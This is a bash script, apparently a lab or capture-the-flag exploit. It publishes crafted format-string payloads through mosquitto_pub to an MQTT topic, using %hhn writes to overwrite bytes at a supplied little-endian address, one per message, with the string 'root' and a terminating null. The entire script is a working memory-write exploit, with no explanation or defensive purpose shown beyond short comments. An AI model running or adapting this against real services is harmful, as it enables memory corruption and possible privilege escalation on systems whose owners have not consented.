#!/bin/bash

# Make sure the supplied address is little-endian!

command_prefix="mosquitto_pub -h 0.0.0.0 -t /topic/qos0 -m"

msb=$(echo -n $1 | tail -6c) # 3 most significant bytes
lsb=$(echo $1 | head -2c) # least significant bytes

write_r="%110x%6\$hhn" # 0x72 - 4 = 0x6e
write_o="%107x%6\$hhn" # 0x6f - 4 = 0x6b
write_t="%112x%6\$hhn" # 0x74 - 4 = 0x70
write_null="%252x%6\$hhn" # 0x00 - 4 = 0xfc

# Each loop adds $i to the least significant byte of our supplied address
for i in {0..4}
do
    # Add $i to the least significant byte
    lsb_decimal=$(printf "%d" $((16#$lsb+$i)))
    lsb_hex=$(printf "%.2x" $lsb_decimal)

    # Combine the new least significant byte with the 3 most significant bytes
    address=$(echo $lsb_hex$msb | xxd -p -r)

    # Format string parameter depends on which loop iteration we are on
    if [ $i -eq 0 ]; then
        inject=$write_r
    elif [ $i -eq 1 ] || [ $i -eq 2 ]; then
        inject=$write_o
    elif [ $i -eq 3 ]; then
        inject=$write_t
    else
        inject=$write_null
    fi

    # Craft and send the payload
    payload=$address$inject
    $command_prefix "$payload"
done